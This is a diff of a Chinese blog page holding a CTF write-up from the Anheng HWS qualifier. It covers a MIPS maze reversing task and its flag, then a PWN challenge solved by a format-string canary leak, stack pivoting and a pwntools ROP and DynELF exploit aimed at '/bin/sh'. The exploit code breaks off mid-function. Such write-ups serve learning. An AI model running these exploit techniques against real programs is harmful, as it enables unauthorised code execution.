@@ -1,37 +1,52 @@
+
+
 <!DOCTYPE html>
-<html lang="zh-CN">
-
-
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
 
 
 
 <head><meta name="generator" content="Hexo 3.9.0">
   <meta charset="UTF-8">
-  <link rel="apple-touch-icon" sizes="76x76" href="/img/apple-touch-icon.png">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
   <link rel="icon" type="image/png" href="/img/favicon.png">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
   <meta http-equiv="x-ua-compatible" content="ie=edge">
   
+  <meta name="theme-color" content="#2f4154">
   <meta name="description" content>
   <meta name="author" content="chumen77">
   <meta name="keywords" content>
-  <title>安恒HWS夏令营选拔赛部分题目 ~ Chumen77&#39;s Blog</title>
+  <title>安恒HWS夏令营选拔赛部分题目 - Chumen77&#39;s Blog</title>
 
-  <link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
-<link rel="stylesheet" href="/lib/bootstrap/css/bootstrap.min.css">
-<link rel="stylesheet" href="/lib/mdbootstrap/css/mdb.min.css">
-<link rel="stylesheet" href="/lib/github-markdown/github-markdown.min.css">
-<link rel="stylesheet" href="//at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">
+  <link rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css">
 
 
-  <link rel="stylesheet" href="/lib/prettify/tomorrow-night-eighties.min.css">
+  <link rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css">
+  <link rel="stylesheet" href="/lib/hint/hint.min.css">
+
+  
+    
+    
+      
+      <link rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.0.0/styles/apache-config.min.css">
+    
+  
+
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
 
 <link rel="stylesheet" href="/css/main.css">
 
+<!-- 自定义样式保持在最底部 -->
 
-  <link rel="stylesheet" href="/lib/fancybox/jquery.fancybox.min.css">
 
-
+  <script src="/js/utils.js"></script>
+  <script src="/js/color-schema.js"></script>
 </head>
 
 
@@ -56,40 +71,60 @@
           
           
           
-          <li class="nav-item">
-            <a class="nav-link" href="/">首页</a>
-          </li>
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
         
           
           
           
           
-          <li class="nav-item">
-            <a class="nav-link" href="/archives/">归档</a>
-          </li>
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
         
           
           
           
           
-          <li class="nav-item">
-            <a class="nav-link" href="/tags/">标签</a>
-          </li>
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
         
           
           
           
           
-          <li class="nav-item">
-            <a class="nav-link" href="/about/">关于</a>
-          </li>
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
         
-          
-          
         
           <li class="nav-item" id="search-btn">
-            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i
-                class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
           </li>
         
       </ul>
@@ -97,51 +132,53 @@
   </div>
 </nav>
 
-    <div class="view intro-2" id="background" false
-         style="background: url('/img/default.png')no-repeat center center;
+    <div class="banner intro-2" id="background" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
            background-size: cover;">
       <div class="full-bg-img">
-        <div class="mask rgba-black-light flex-center">
-          <div class="container text-center white-text fadeInUp">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="container page-header text-center fade-in-up">
             <span class="h2" id="subtitle">
               
             </span>
 
             
-              <br>
-              
-                <p class="mt-3">
-                  <i class="fas fa-calendar-alt" aria-hidden="true"></i>&nbsp;
-                  星期日, 八月 16日 2020, 7:12 晚上
-                </p>
-              
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2020-08-16 19:12" pubdate>
+        2020年8月16日 晚上
+      </time>
+    </span>
+  
+</div>
 
-              <p>
-                
-                  
-                  &nbsp;<i class="far fa-chart-bar"></i>
-                  <span class="post-count">
-                    1.9k 字
-                  </span>&nbsp;
-                
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      1.8k 字
+    </span>
+  
 
-                
-                  
-                  &nbsp;<i class="far fa-clock"></i>
-                  <span class="post-count">
-                      9 分钟
-                  </span>&nbsp;
-                
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      26
+       分钟
+    </span>
+  
 
-                
-                  <!-- 不蒜子统计文章PV -->
-                  
-                  &nbsp;<i class="far fa-eye" aria-hidden="true"></i>&nbsp;
-                  <span id="busuanzi_container_page_pv">
-                    <span id="busuanzi_value_page_pv"></span> 次
-                  </span>&nbsp;
-                
-              </p>
+  
+  
+</div>
+
             
           </div>
 
@@ -159,91 +196,100 @@
   <div class="row">
     <div class="d-none d-lg-block col-lg-2"></div>
     <div class="col-lg-8 nopadding-md">
-      <div class="py-5 z-depth-3" id="board">
-        <div class="post-content mx-auto" id="post">
-          <div class="markdown-body">
-            <h1 id="安恒HWS夏令营选拔赛部分题目"><a href="#安恒HWS夏令营选拔赛部分题目" class="headerlink" title="安恒HWS夏令营选拔赛部分题目"></a>安恒HWS夏令营选拔赛部分题目</h1><h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="IOT1"><a href="#IOT1" class="headerlink" title="IOT1"></a>IOT1</h3><h4 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h4><p>参考：<br><a href="https://www.cnblogs.com/csnd/p/11800622.html" target="_blank" rel="noopener">https://www.cnblogs.com/csnd/p/11800622.html</a></p>
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto" id="post">
+            <!-- SEO header -->
+            <h1 style="display: none">安恒HWS夏令营选拔赛部分题目</h1>
+            
+            <div class="markdown-body" id="post-body">
+              <h1 id="安恒HWS夏令营选拔赛部分题目"><a href="#安恒HWS夏令营选拔赛部分题目" class="headerlink" title="安恒HWS夏令营选拔赛部分题目"></a>安恒HWS夏令营选拔赛部分题目</h1><h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="IOT1"><a href="#IOT1" class="headerlink" title="IOT1"></a>IOT1</h3><h4 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h4><p>参考：<br><a href="https://www.cnblogs.com/csnd/p/11800622.html" target="_blank" rel="noopener">https://www.cnblogs.com/csnd/p/11800622.html</a></p>
 <p>注意网卡那块，要对应自己虚拟机网卡的情况。</p>
-<h5 id="启动命令："><a href="#启动命令：" class="headerlink" title="启动命令："></a>启动命令：</h5><pre><code class="python">qemu-system-mipsel -M malta -hda openwrt-malta-le-root.ext4 -kernel openwrt-malta-le-vmlinux.elf -nographic -append &quot;root=/dev/sda console=tty50&quot;  -net nic -net tap</code></pre>
-<h4 id="把虚拟机中要分析的maze文件取出来"><a href="#把虚拟机中要分析的maze文件取出来" class="headerlink" title="把虚拟机中要分析的maze文件取出来"></a>把虚拟机中要分析的maze文件取出来</h4><pre><code class="bash">scp -r /path/maze username@servername:/path </code></pre>
-<h4 id="使用ghidra进行分析"><a href="#使用ghidra进行分析" class="headerlink" title="使用ghidra进行分析"></a>使用ghidra进行分析</h4><pre><code class="bash">  fgets(buf,0x28,_stdin);
-  len = strlen(buf);
-  uStack68 = 0x20;
-  if (*(char *)((int)&amp;uStack68 + len + 3) == &#39;\n&#39;) {
-    *(undefined *)((int)&amp;uStack68 + len + 3) = 0;
-    len = len - 1;
-  }
-  if (len != 0x20) {
-    eorr();
-  }</code></pre>
+<h5 id="启动命令："><a href="#启动命令：" class="headerlink" title="启动命令："></a>启动命令：</h5><div class="hljs"><pre><code class="hljs python">qemu-system-mipsel -M malta -hda openwrt-malta-le-root.ext4 -kernel openwrt-malta-le-vmlinux.elf -nographic -append <span class="hljs-string">"root=/dev/sda console=tty50"</span>  -net nic -net tap</code></pre></div>
+
+<h4 id="把虚拟机中要分析的maze文件取出来"><a href="#把虚拟机中要分析的maze文件取出来" class="headerlink" title="把虚拟机中要分析的maze文件取出来"></a>把虚拟机中要分析的maze文件取出来</h4><div class="hljs"><pre><code class="hljs bash">scp -r /path/maze username@servername:/path</code></pre></div>
+
+<h4 id="使用ghidra进行分析"><a href="#使用ghidra进行分析" class="headerlink" title="使用ghidra进行分析"></a>使用ghidra进行分析</h4><div class="hljs"><pre><code class="hljs bash">fgets(buf,0x28,_stdin);
+len = strlen(buf);
+uStack68 = 0x20;
+<span class="hljs-keyword">if</span> (*(char *)((int)&amp;uStack68 + len + 3) == <span class="hljs-string">'\n'</span>) &#123;
+  *(undefined *)((int)&amp;uStack68 + len + 3) = 0;
+  len = len - 1;
+&#125;
+<span class="hljs-keyword">if</span> (len != 0x20) &#123;
+  eorr();
+&#125;</code></pre></div>
+
 <p>这一段可以确定让输入的是32个字符。</p>
-<pre><code class="c">
-void FUN_004006f0(void)
+<div class="hljs"><pre><code class="hljs c">
+<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">FUN_004006f0</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span>
 
-{
-  int i;
-  int j;
+</span>&#123;
+  <span class="hljs-keyword">int</span> i;
+  <span class="hljs-keyword">int</span> j;
+  
+  i = <span class="hljs-number">0</span>;
+  <span class="hljs-keyword">while</span> (i &lt; DAT_16) &#123;
+    j = <span class="hljs-number">0</span>;
+    <span class="hljs-keyword">while</span> (j &lt; <span class="hljs-number">8</span>) &#123;
+      maze[i * <span class="hljs-number">8</span> + j] =
+           (<span class="hljs-keyword">char</span>)(((<span class="hljs-keyword">int</span>)s_AMz1nG~#--Ma7e~_00411034[i] &amp; *(uint *)(&amp;DAT_00411044 + j * <span class="hljs-number">4</span>)) &gt;&gt;
+                 (<span class="hljs-number">7U</span> - j &amp; <span class="hljs-number">0x1f</span>));
+      j = j + <span class="hljs-number">1</span>;
+    &#125;
+    i = i + <span class="hljs-number">1</span>;
+  &#125;
+  <span class="hljs-keyword">return</span>;
+&#125;</code></pre></div>
 
-  i = 0;
-  while (i &lt; DAT_16) {
-    j = 0;
-    while (j &lt; 8) {
-      maze[i * 8 + j] =
-           (char)(((int)s_AMz1nG~#--Ma7e~_00411034[i] &amp; *(uint *)(&amp;DAT_00411044 + j * 4)) &gt;&gt;
-                 (7U - j &amp; 0x1f));
-      j = j + 1;
-    }
-    i = i + 1;
-  }
-  return;
-}
-
-</code></pre>
 <p>可以看到迷宫是在运行时根据部分数据，来生成的。并且其中一行是8个数据，一列是16个，一共128个数据。</p>
 <p>可以使用gdb，断点在这个函数之后，把迷宫提取出来。提取出来的都是0x1 和 0x0<br>组成的迷宫。</p>
 <p>进入控制走位的函数：</p>
-<pre><code class="c">  heng = 1;
-  shu = 0;
-  pcStackX0 = param_1</code></pre>
+<div class="hljs"><pre><code class="hljs c">heng = <span class="hljs-number">1</span>;
+shu = <span class="hljs-number">0</span>;
+pcStackX0 = param_1</code></pre></div>
+
 <p>这个地方控制说，起先起点是第1行的第2个位置。</p>
 <p>check函数，主要是看你是不是在移动后，走到了0上，走到的话，程序就判你失败。</p>
 <p>往下看，发现主要判断：</p>
-<pre><code class="c">          if (cVar1 != &#39;U&#39;) {
+<div class="hljs"><pre><code class="hljs c">          <span class="hljs-keyword">if</span> (cVar1 != <span class="hljs-string">'U'</span>) &#123;
 LAB_00400ad4:
-            if ((heng == 1) &amp;&amp; (shu == 10)) {
-              uVar3 = 1;
-            }
-            else {
-              uVar3 = 0;
-            }</code></pre>
+            <span class="hljs-keyword">if</span> ((heng == <span class="hljs-number">1</span>) &amp;&amp; (shu == <span class="hljs-number">10</span>)) &#123;
+              uVar3 = <span class="hljs-number">1</span>;
+            &#125;
+            <span class="hljs-keyword">else</span> &#123;
+              uVar3 = <span class="hljs-number">0</span>;
+            &#125;</code></pre></div>
+
 <p>在这一段，可以确定走到第11列的第2个数字即可。</p>
-<h4 id="提取迷宫图并处理"><a href="#提取迷宫图并处理" class="headerlink" title="提取迷宫图并处理"></a>提取迷宫图并处理</h4><h5 id="脚本提取"><a href="#脚本提取" class="headerlink" title="脚本提取"></a>脚本提取</h5><pre><code class="c">data=&quot;AMz1nG~#--Ma7e~&quot;
-data2=[0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1]
+<h4 id="提取迷宫图并处理"><a href="#提取迷宫图并处理" class="headerlink" title="提取迷宫图并处理"></a>提取迷宫图并处理</h4><h5 id="脚本提取"><a href="#脚本提取" class="headerlink" title="脚本提取"></a>脚本提取</h5><div class="hljs"><pre><code class="hljs c">data=<span class="hljs-string">"AMz1nG~#--Ma7e~"</span>
+data2=[<span class="hljs-number">0x80</span>,<span class="hljs-number">0x40</span>,<span class="hljs-number">0x20</span>,<span class="hljs-number">0x10</span>,<span class="hljs-number">0x8</span>,<span class="hljs-number">0x4</span>,<span class="hljs-number">0x2</span>,<span class="hljs-number">0x1</span>]
 maze=[]
-lie=0
-while lie&lt;15:
-    hang=0
-    while hang&lt;8:
-        # print(hex(ord(data[lie])&amp;data2[hang]),(7-hang&amp;0x1f))
-        maze.append((ord(data[lie])&amp;data2[hang])&gt;&gt;(7-hang&amp;0x1f))
-        hang+=1
-    lie+=1
-print(maze)
-</code></pre>
+lie=<span class="hljs-number">0</span>
+<span class="hljs-keyword">while</span> lie&lt;<span class="hljs-number">15</span>:
+    hang=<span class="hljs-number">0</span>
+    <span class="hljs-keyword">while</span> hang&lt;<span class="hljs-number">8</span>:
+        # print(hex(ord(data[lie])&amp;data2[hang]),(<span class="hljs-number">7</span>-hang&amp;<span class="hljs-number">0x1f</span>))
+        maze.append((ord(data[lie])&amp;data2[hang])&gt;&gt;(<span class="hljs-number">7</span>-hang&amp;<span class="hljs-number">0x1f</span>))
+        hang+=<span class="hljs-number">1</span>
+    lie+=<span class="hljs-number">1</span>
+print(maze)</code></pre></div>
+
 <p><img src="http://qiqianyun.chumen77.xyz/uPic/lAdA8H.png" srcset="/img/loading.gif" alt></p>
 <p>就这迷宫，我看了好一会才能走好。🤣🤣服了自己，老以为是数据提取错了。</p>
-<pre><code class="bash">flag = md5{DDRDDLDDRRRRRDRDDDDDLLDDLLLUUULU}</code></pre>
+<div class="hljs"><pre><code class="hljs bash">flag = md5&#123;DDRDDLDDRRRRRDRDDDDDLLDDLLLUUULU&#125;</code></pre></div>
+
 <h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="baby-canary"><a href="#baby-canary" class="headerlink" title="baby_canary_"></a><code>baby_canary_</code></h3><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><h5 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h5><ul>
 <li>格式化字符串漏洞，可以用来泄漏。</li>
 <li>栈溢出，只能1个gadget。</li>
 </ul>
 <h5 id="难点"><a href="#难点" class="headerlink" title="难点"></a>难点</h5><h6 id="栈迁移"><a href="#栈迁移" class="headerlink" title="栈迁移"></a>栈迁移</h6><p>只能溢出一个gadget，肯定是打栈迁移，但是跟以往的栈迁移不同的是，这一个gadget只能溢出到rbp，并不能覆盖到ret address，所以只能覆盖好rbp后，利用程序走出这个函数后，将要结束程序时的<code>leave ret</code> 。</p>
 <p>但是需要注意的是因为在走过一次 <code>leave ret</code>时，此时的rbp已经被改了，再过程序的第二个leave ret 前，需要过一下canary的检测:</p>
-<pre><code class="bash">[----------------------------------registers-----------------------------------]
+<div class="hljs"><pre><code class="hljs bash">[----------------------------------registers-----------------------------------]
 RAX: 0x0
 RBX: 0x0
 RCX: 0x0
-RDX: 0x38 (&#39;8&#39;)
+RDX: 0x38 (<span class="hljs-string">'8'</span>)
 RSI: 0x7ffefee5e310 --&gt; 0x26c46b053d3e2f00
 RDI: 0x0
 RBP: 0x601198 --&gt; 0x26c46b053d3e2f00
@@ -251,13 +297,13 @@ RSP: 0x7ffefee5e350 --&gt; 0x7ffefee5e440 --&gt; 0x1
 RIP: 0x4008de (mov    rdx,QWORD PTR [rbp-0x8])
 R8 : 0x7f0bb0977700 (0x00007f0bb0977700)
 R9 : 0x12
-R10: 0x78 (&#39;x&#39;)
+R10: 0x78 (<span class="hljs-string">'x'</span>)
 R11: 0x246
 R12: 0x400680 (xor    ebp,ebp)
 R13: 0x7ffefee5e440 --&gt; 0x1
 R14: 0x0
 R15: 0x0
-EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
+EFLAGS: 0x246 (carry PARITY adjust ZERO sign <span class="hljs-built_in">trap</span> INTERRUPT direction overflow)
 [-------------------------------------code-------------------------------------]
    0x4008cf:    mov    eax,0x0
    0x4008d4:    call   0x4007de
@@ -265,180 +311,204 @@ EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
 =&gt; 0x4008de:    mov    rdx,QWORD PTR [rbp-0x8]
    0x4008e2:    xor    rdx,QWORD PTR fs:0x28
    0x4008eb:    je     0x4008f2
-   0x4008ed:    call   0x400600 &lt;__stack_chk_fail@plt&gt;
-</code></pre>
+   0x4008ed:    call   0x400600 &lt;__stack_chk_fail@plt&gt;</code></pre></div>
+
 <p>看这里，在取数值时，其在你迁移的bss段读取数值到rdx进行判断的，所以在第一次往bss段读的时候，填充好canary的值。</p>
 <p>并且这个题，在看got表到bss段的距离也是很近的。</p>
 <p><img src="http://qiqianyun.chumen77.xyz/uPic/zbOm9Q.png" srcset="/img/loading.gif" alt></p>
 <p>所以在迁移的时候需要注意，从有实际意义的函数（比如puts）开始前就得把栈抬高。否则在进入libc的内部调用函数时，会因为各种push pop 而修改到got处的东西，导致不仅泄漏的数值有问题，并且容易让程序崩掉。</p>
-<pre><code class="bash">payload = p64(canary)*(0x100/8)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(pop_rdi)+p64(0)
+<div class="hljs"><pre><code class="hljs bash">payload = p64(canary)*(0x100/8)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(pop_rdi)+p64(0)
 
-s.sendafter(&quot;canary &#39; s 5 0 n g :&quot;,payload)
+s.sendafter(<span class="hljs-string">"canary ' s 5 0 n g :"</span>,payload)
 payload = p64(canary)*6+p64(bss+0x100-8)
-s.sendafter(&quot;canary &#39; s h 0 m e :&quot;,payload)
+s.sendafter(<span class="hljs-string">"canary ' s h 0 m e :"</span>,payload)
 s.recvline()
-puts = u64(s.recv(6).ljust(8,&#39;\x00&#39;))
+puts = u64(s.recv(6).ljust(8,<span class="hljs-string">'\x00'</span>))
 success(hex(puts))
-s.recvline()</code></pre>
+s.recvline()</code></pre></div>
+
 <p>此处就可以泄漏出puts函数的libc地址，但是由于出题人想考察<code>ret2dl_runtime_resolve</code>,所以应该是魔改了libc。</p>
 <p>然后可以使用DynELF来搞定，参考群里师傅分享的exp。</p>
 <h6 id="Dynelf函数怎么写"><a href="#Dynelf函数怎么写" class="headerlink" title="Dynelf函数怎么写"></a>Dynelf函数怎么写</h6><p>由于程序只有puts函数来输出，就用puts函数来进行泄漏。</p>
-<pre><code class="python">payload = p64(0) * 57 +p64(canary) * 2  +p64(pop_rdi)+p64(address)+p64(puts_plt)+ p64(start_addr)</code></pre>
+<div class="hljs"><pre><code class="hljs python">payload = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">57</span> +p64(canary) * <span class="hljs-number">2</span>  +p64(pop_rdi)+p64(address)+p64(puts_plt)+ p64(start_addr)</code></pre></div>
+
 <p>本来我是这样写的，但是发现程序还是会崩，由于程序情况的限制，栈只能提高<code>0x1b0</code>这样，还是不够用。</p>
 <p>还是就想办法提升栈，往高点的bss上写入rop进行想要的操作。</p>
 <p>这个就在Dynelf前写好,用rop控制参数，调用read函数来往高点的bss段进行写payload，并且最后用pop rsp的操作，把写好rop chain的bss的地址pop 到rsp上，然后再ret上去：</p>
-<pre><code class="python">payload = p64(canary)*(0x100/8)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(pop_rdi)+p64(0)
-payload += p64(pop_rsi_r15)+p64(bss+0x500)+p64(0)+p64(read_plt)+p64(pop_rsp_3)+p64(bss+0x500-8*3)+&quot;/bin/sh\x00&quot;
+<div class="hljs"><pre><code class="hljs python">payload = p64(canary)*(<span class="hljs-number">0x100</span>/<span class="hljs-number">8</span>)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(pop_rdi)+p64(<span class="hljs-number">0</span>)
+payload += p64(pop_rsi_r15)+p64(bss+<span class="hljs-number">0x500</span>)+p64(<span class="hljs-number">0</span>)+p64(read_plt)+p64(pop_rsp_3)+p64(bss+<span class="hljs-number">0x500</span><span class="hljs-number">-8</span>*<span class="hljs-number">3</span>)+<span class="hljs-string">"/bin/sh\x00"</span>
 
-s.sendafter(&quot;canary &#39; s 5 0 n g :&quot;,payload)
-payload = p64(canary)*6+p64(bss+0x100-8)
-s.sendafter(&quot;canary &#39; s h 0 m e :&quot;,payload)
-s.recvline()</code></pre>
+s.sendafter(<span class="hljs-string">"canary ' s 5 0 n g :"</span>,payload)
+payload = p64(canary)*<span class="hljs-number">6</span>+p64(bss+<span class="hljs-number">0x100</span><span class="hljs-number">-8</span>)
+s.sendafter(<span class="hljs-string">"canary ' s h 0 m e :"</span>,payload)
+s.recvline()</code></pre></div>
+
 <p>接着就是用这写好好的rop chain，进行泄漏地址，为了Dynelf多次调用泄漏，在泄漏地址后，跟上read函数继续往这段地址上读取同样的rop chain，然后再次控制rsp，接着ret到对应的位置：</p>
-<pre><code class="python">def vuln(address):
-    payload = p64(pop_rdi)+p64(address)+p64(puts_plt)+p64(pop_rdi)+p64(0)
-    payload += p64(pop_rsi_r15)+p64(bss+0x500)+p64(0) + \
-                   p64(read_plt)+p64(pop_rsp_3)+p64(0x6015a0-8*3)
-    s.recvline(timeout=0.07)
+<div class="hljs"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">vuln</span><span class="hljs-params">(address)</span>:</span>
+    payload = p64(pop_rdi)+p64(address)+p64(puts_plt)+p64(pop_rdi)+p64(<span class="hljs-number">0</span>)
+    payload += p64(pop_rsi_r15)+p64(bss+<span class="hljs-number">0x500</span>)+p64(<span class="hljs-number">0</span>) + \
+                   p64(read_plt)+p64(pop_rsp_3)+p64(<span class="hljs-number">0x6015a0</span><span class="hljs-number">-8</span>*<span class="hljs-number">3</span>)
+    s.recvline(timeout=<span class="hljs-number">0.07</span>)
     s.send(payload)
-    count = 0
-    up = &quot;&quot;
-    buf = &#39;&#39;
-    while True:
-        c = s.recv(numb=1, timeout=0.07)
-        count += 1
-        if up == &#39;\n&#39; and c == &quot;&quot;:  
-            buf = buf[:-1]            
-            buf += &quot;\x00&quot;
-            break
-        else:
+    count = <span class="hljs-number">0</span>
+    up = <span class="hljs-string">""</span>
+    buf = <span class="hljs-string">''</span>
+    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
+        c = s.recv(numb=<span class="hljs-number">1</span>, timeout=<span class="hljs-number">0.07</span>)
+        count += <span class="hljs-number">1</span>
+        <span class="hljs-keyword">if</span> up == <span class="hljs-string">'\n'</span> <span class="hljs-keyword">and</span> c == <span class="hljs-string">""</span>:  
+            buf = buf[:<span class="hljs-number">-1</span>]            
+            buf += <span class="hljs-string">"\x00"</span>
+            <span class="hljs-keyword">break</span>
+        <span class="hljs-keyword">else</span>:
             buf += c
             up = c
-    data = buf[:8]
-    log.debug(&quot;%#x =&gt; %s&quot; % (address, (data or &#39;&#39;).encode(&#39;hex&#39;)))
-    return data</code></pre>
+    data = buf[:<span class="hljs-number">8</span>]
+    log.debug(<span class="hljs-string">"%#x =&gt; %s"</span> % (address, (data <span class="hljs-keyword">or</span> <span class="hljs-string">''</span>).encode(<span class="hljs-string">'hex'</span>)))
+    <span class="hljs-keyword">return</span> data</code></pre></div>
+
 <p>可以看到是提高了0x500个字节的地方进行rop，做好用控制rsp，ret后进行反复横跳跃，完成对system 的寻找。感觉这是很好的办法，因为栈迁移的核心还是控制rsp，最初学习是见过2次栈迁移的题目，当时用的还是leave ret 来进行的控制，现在看到直接使用pop rsp 来控制，的确是方便又简单的办法。</p>
-<h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><pre><code class="python">from pwn import *
-# from LibcSearcher import *
-s = process(&quot;./pwn&quot;)
-# s = remote(&quot;183.129.189.61&quot;,54900)
-libc = ELF(&quot;/lib/x86_64-linux-gnu/libc-2.23.so&quot;)
-elf = ELF(&quot;./pwn&quot;)
-context.log_level=&#39;debug&#39;
-def debug():
-    # gdb.attach(proc.pidof(s)[0],gdbscript=&#39;b main&#39;)
+<h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+<span class="hljs-comment"># from LibcSearcher import *</span>
+s = process(<span class="hljs-string">"./pwn"</span>)
+<span class="hljs-comment"># s = remote("183.129.189.61",54900)</span>
+libc = ELF(<span class="hljs-string">"/lib/x86_64-linux-gnu/libc-2.23.so"</span>)
+elf = ELF(<span class="hljs-string">"./pwn"</span>)
+context.log_level=<span class="hljs-string">'debug'</span>
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>
+    <span class="hljs-comment"># gdb.attach(proc.pidof(s)[0],gdbscript='b main')</span>
     gdb.attach(s)
     pause()
-pop_rdi = 0x0000000000400963
-pop_rsi_r15 = 0x0000000000400961
-pop_rsp_3 = 0x000000000040095d
-leave_ret = 0x00000000004007dc
-context.terminal = [&#39;tmux&#39;,&#39;neww&#39;]
-puts_plt = elf.plt[&#39;puts&#39;]
-puts_got = elf.got[&#39;puts&#39;]
-read_plt = elf.plt[&#39;read&#39;]
-bss = 0x6010a0
-s.sendafter(&quot;canary &#39; s @ # $ % ^ &amp; * :\n&quot;, &quot;%9$p&quot;)
-canary = int(s.recvline(keepends=False), 16)
+pop_rdi = <span class="hljs-number">0x0000000000400963</span>
+pop_rsi_r15 = <span class="hljs-number">0x0000000000400961</span>
+pop_rsp_3 = <span class="hljs-number">0x000000000040095d</span>
+leave_ret = <span class="hljs-number">0x00000000004007dc</span>
+context.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]
+puts_plt = elf.plt[<span class="hljs-string">'puts'</span>]
+puts_got = elf.got[<span class="hljs-string">'puts'</span>]
+read_plt = elf.plt[<span class="hljs-string">'read'</span>]
+bss = <span class="hljs-number">0x6010a0</span>
+s.sendafter(<span class="hljs-string">"canary ' s @ # $ % ^ &amp; * :\n"</span>, <span class="hljs-string">"%9$p"</span>)
+canary = int(s.recvline(keepends=<span class="hljs-literal">False</span>), <span class="hljs-number">16</span>)
 success(hex(canary))
-context.arch = &#39;amd64&#39;
+context.arch = <span class="hljs-string">'amd64'</span>
 
 
-def vuln(address):
-    payload = p64(pop_rdi)+p64(address)+p64(puts_plt)+p64(pop_rdi)+p64(0)
-    payload += p64(pop_rsi_r15)+p64(bss+0x500)+p64(0) + \
-                   p64(read_plt)+p64(pop_rsp_3)+p64(0x6015a0-8*3)
-    s.recvline(timeout=0.07)
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">vuln</span><span class="hljs-params">(address)</span>:</span>
+    payload = p64(pop_rdi)+p64(address)+p64(puts_plt)+p64(pop_rdi)+p64(<span class="hljs-number">0</span>)
+    payload += p64(pop_rsi_r15)+p64(bss+<span class="hljs-number">0x500</span>)+p64(<span class="hljs-number">0</span>) + \
+                   p64(read_plt)+p64(pop_rsp_3)+p64(<span class="hljs-number">0x6015a0</span><span class="hljs-number">-8</span>*<span class="hljs-number">3</span>)
+    s.recvline(timeout=<span class="hljs-number">0.07</span>)
     s.send(payload)
-    count = 0
-    up = &quot;&quot;
-    buf = &#39;&#39;
-    while True:
-        c = s.recv(numb=1, timeout=0.07)
-        count += 1
-        if up == &#39;\n&#39; and c == &quot;&quot;:  
-            buf = buf[:-1]            
-            buf += &quot;\x00&quot;
-            break
-        else:
+    count = <span class="hljs-number">0</span>
+    up = <span class="hljs-string">""</span>
+    buf = <span class="hljs-string">''</span>
+    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
+        c = s.recv(numb=<span class="hljs-number">1</span>, timeout=<span class="hljs-number">0.07</span>)
+        count += <span class="hljs-number">1</span>
+        <span class="hljs-keyword">if</span> up == <span class="hljs-string">'\n'</span> <span class="hljs-keyword">and</span> c == <span class="hljs-string">""</span>:  
+            buf = buf[:<span class="hljs-number">-1</span>]            
+            buf += <span class="hljs-string">"\x00"</span>
+            <span class="hljs-keyword">break</span>
